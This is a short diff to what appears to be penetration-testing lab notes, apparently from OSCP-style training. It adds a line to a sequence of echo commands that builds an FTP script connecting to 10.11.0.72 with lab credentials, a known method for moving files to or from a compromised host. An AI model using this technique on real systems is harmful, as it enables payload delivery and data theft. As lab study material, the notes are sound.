@@ -1,5 +1,6 @@
 FTP :
 
+echo open 10.11.0.72 21> ftp.txt
 echo USER offsec>> ftp.txt 
 echo ftp>> ftp.txt 
 echo bin >> ftp.txt 
